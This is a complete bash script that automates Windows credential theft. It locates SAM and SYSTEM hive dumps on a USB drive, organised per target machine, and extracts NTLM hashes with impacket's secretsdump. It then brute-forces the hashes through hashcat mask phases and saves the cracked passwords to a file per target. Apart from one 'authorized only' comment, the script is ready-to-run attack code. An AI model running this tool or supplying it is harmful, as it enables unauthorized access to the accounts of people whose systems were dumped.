#!/usr/bin/env bash
# auto_hives_dump_and_crack.sh
# End-to-end: newest hive dump on USB -> secretsdump -> extract hashes -> Hashcat -> per-target cracked file
# Usage:
#   chmod +x auto_hives_dump_and_crack.sh
#   ./auto_hives_dump_and_crack.sh
#   ./auto_hives_dump_and_crack.sh /media/<user>/<USB_LABEL>
#   ./auto_hives_dump_and_crack.sh --device /dev/sdXN
# Notes:
#   - For systems/artifacts you are authorized to test only.
#   - Requires: python3-impacket, hashcat

set -euo pipefail

die(){ echo "[!] $*" >&2; exit 1; }
info(){ echo "[*] $*"; }
ok(){ echo "[✓] $*"; }

need_bin(){ command -v "$1" >/dev/null 2>&1 || die "Missing dependency: $1"; }

PYTHON=python3
HASHCAT=hashcat
SECRETDUMP=()

need_bin "$PYTHON"
need_bin "$HASHCAT"

# Resolve secretsdump entrypoint
if $PYTHON -c "import impacket" >/dev/null 2>&1; then
  SECRETDUMP=($PYTHON -m impacket.examples.secretsdump)
elif [[ -x /usr/bin/secretsdump.py ]]; then
  SECRETDUMP=(/usr/bin/secretsdump.py)
elif [[ -f /usr/share/doc/python3-impacket/examples/secretsdump.py ]]; then
  SECRETDUMP=($PYTHON /usr/share/doc/python3-impacket/examples/secretsdump.py)
else
  die "Impacket not found. Install with: sudo apt update && sudo apt install -y python3-impacket"
fi

# -------- Locate or mount USB --------
MOUNT="${1:-}"
TRAP_MOUNTED=0
if [[ "${MOUNT:-}" == "--device" ]]; then
  DEVICE="${2:-}"
  [[ -n "$DEVICE" ]] || die "Pass a device path, e.g. --device /dev/sdb1"
  MOUNT="/mnt/usb"
  sudo mkdir -p "$MOUNT"
  if ! mountpoint -q "$MOUNT"; then
    info "Mounting $DEVICE -> $MOUNT"
    sudo mount "$DEVICE" "$MOUNT"
    TRAP_MOUNTED=1
  fi
fi

if [[ -z "${MOUNT:-}" ]]; then
  for base in "/media/$USER" "/run/media/$USER" "/mnt/usb"; do
    [[ -d "$base" ]] || continue
    for mp in "$base"/* "$base"; do
      [[ -d "$mp/hives" ]] && MOUNT="$mp" && break 2
    done
  done
fi

[[ -n "${MOUNT:-}" ]] || die "Could not find USB mountpoint. Pass a mountpoint or use --device /dev/sdXN"
[[ -d "$MOUNT/hives" ]] || die "No 'hives' folder at $MOUNT"

info "Using USB mount: $MOUNT"

# -------- Find newest hive folder: hives/<LABEL>/<STAMP> --------
LATEST_DIR="$(find "$MOUNT/hives" -mindepth 2 -maxdepth 2 -type d 2>/dev/null | sort | tail -n1 || true)"
[[ -n "$LATEST_DIR" ]] || die "No hive folders under $MOUNT/hives (expected hives/<LABEL>/<STAMP>/)"
ok "Newest hive folder: $LATEST_DIR"

LABEL="$(basename "$(dirname "$LATEST_DIR")")"
STAMP="$(basename "$LATEST_DIR")"

# Resolve hive files (accept .save or raw)
SAM="$LATEST_DIR/SAM.save"; [[ -f "$SAM" ]] || SAM="$LATEST_DIR/SAM"
SYSTEM="$LATEST_DIR/SYSTEM.save"; [[ -f "$SYSTEM" ]] || SYSTEM="$LATEST_DIR/SYSTEM"
[[ -f "$SAM" && -f "$SYSTEM" ]] || die "Missing SAM/SYSTEM in $LATEST_DIR"

ok "Found hives: $(basename "$SAM"), $(basename "$SYSTEM")"
RESULTS_DIR="$MOUNT/results/$LABEL/$STAMP"
mkdir -p "$RESULTS_DIR"

# -------- secretsdump --------
SD_LOG="$RESULTS_DIR/secretsdump_$(date +%F_%H-%M-%S).log"
info "Running secretsdump -> $SD_LOG"
"${SECRETDUMP[@]}" -sam "$SAM" -system "$SYSTEM" LOCAL | tee "$SD_LOG" >/dev/null
ok "secretsdump complete"

# -------- Extract NTLM hashes --------
HASHES="$RESULTS_DIR/hashes.txt"
# Common secretsdump line: user:RID:LM:NT:...
grep -E "^[^:]+:[0-9a-fA-F]{1,8}:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}" "$SD_LOG" \
  | awk -F: '{print $1":"$3":"$4}' > "$HASHES" || true

# Fallback: any user:*:LM:NT pattern
if [[ ! -s "$HASHES" ]]; then
  grep -E "^[^:]+:[^:]+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}" "$SD_LOG" > "$HASHES" || true
fi

[[ -s "$HASHES" ]] || die "No NTLM hashes extracted into $HASHES. Check $SD_LOG."
ok "Extracted hashes -> $HASHES"

# -------- Hashcat progression (no wordlists) --------
SESSION_BASE="NTLM_${LABEL}_${STAMP}"

run_mask() {
  local session="$1"; shift
  local mask="$1"; shift
  info "Starting Hashcat: session=$session mask=$mask"
  $HASHCAT -m 1000 -a 3 "$HASHES" "$mask" "$@" \
    --session "$session" \
    --status --status-timer=20 \
    --machine-readable
  ok "Finished: $session"
}

info "Launching Hashcat progression (this may take time)."

# Phase 1: ≤6 chars (incremental, full printable)
run_mask "${SESSION_BASE}_inc6_all" '?a?a?a?a?a?a' --increment

# Phase 2: common 8-char masks
run_mask "${SESSION_BASE}_8_lower" '?l?l?l?l?l?l?l?l'
run_mask "${SESSION_BASE}_8_mix1"  '?u?l?l?l?l?d?d?d'
run_mask "${SESSION_BASE}_8_mix2"  '?l?l?l?l?l?d?d?d'

# Phase 3: full 8-char keyspace (heavy). Comment out if you want to skip.
run_mask "${SESSION_BASE}_8_full"  '?a?a?a?a?a?a?a?a'

# -------- Save cracked results per-target --------
CRACKED_OUT="$RESULTS_DIR/cracked_${LABEL}_${STAMP}.txt"
info "Writing cracked credentials to: $CRACKED_OUT"
$HASHCAT --show -m 1000 "$HASHES" > "$CRACKED_OUT" || true

ok "All phases completed."
echo
echo "Artifacts for target '$LABEL' ($STAMP):"
echo "  - secretsdump log: $SD_LOG"
echo "  - hashes:          $HASHES"
echo "  - cracked creds:   $CRACKED_OUT"
echo
echo "Resume a session example:"
echo "  hashcat --session ${SESSION_BASE}_8_full --restore"
echo

# Optional unmount
if [[ "${TRAP_MOUNTED:-0}" == "1" ]]; then
  info "Unmounting $MOUNT"
  sudo umount "$MOUNT"
fi
ok "Done."
